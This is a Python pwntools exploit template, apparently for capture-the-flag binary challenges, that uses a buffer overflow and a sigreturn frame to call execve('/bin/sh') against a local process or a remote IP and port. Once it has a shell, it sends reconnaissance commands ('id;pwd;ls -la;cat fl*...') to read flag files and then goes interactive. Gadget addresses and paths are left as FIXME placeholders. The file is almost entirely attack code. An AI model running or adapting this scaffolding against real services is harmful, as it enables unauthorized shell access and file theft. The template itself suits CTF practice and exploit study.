#!/usr/bin/env python

from __future__ import print_function

from pwn import *

"""
Run against local with:
./exploit.py
Debug against local with:
./exploit.py DEBUG
Run against remote with:
./exploit.py REMOTE IP=x.x.x.x PORT=xxxx
"""

PROG_PATH = 'FIXME'
context.binary = PROG_PATH
context.terminal = ['tmux', 'new-window']
context.log_level = 'debug'
elf = context.binary

LIBC_PATH = 'FIXME'
libc = ELF(LIBC_PATH)

SURVEY = 'id;pwd;ls -la;cat fl* /home/*/fl*'

if args['REMOTE']:
    io = remote(args['IP'], int(args['PORT']))
else:
    io = process(PROG_PATH)

# get our gadgets
bin_sh = libc.search('/bin/sh\x00').next()
sigreturn = ...  # FIXME
syscall = ...  # FIXME

# dump addresses
log.info('/bin/sh gadget:     %x' % bin_sh)
log.info('sigreturn address:  %x' % sigreturn)
log.info('syscall address:    %x' % syscall)

# send some initial info
log.info('Getting set up...')
io.recvuntil('Username: ')  # FIXME

# build sigreturn frame
frame = SigreturnFrame()
frame.rax = constants.SYS_execve
frame.rdi = bin_sh
frame.rsi = 0
frame.rdx = 0
frame.rip = syscall

# attach if we are debugging
if args['DEBUG']:
    gdb.attach(io)
    pause()

# build and send payload buffer
buf = ''
buf += 'A' * 100
buf += p64(sigreturn)
buf += str(frame)
io.sendline(buf)

# run our payloads
log.info('Running survey...')
io.sendline(SURVEY)
print(io.recvall())
log.info('Going interactive...')
io.interactive()
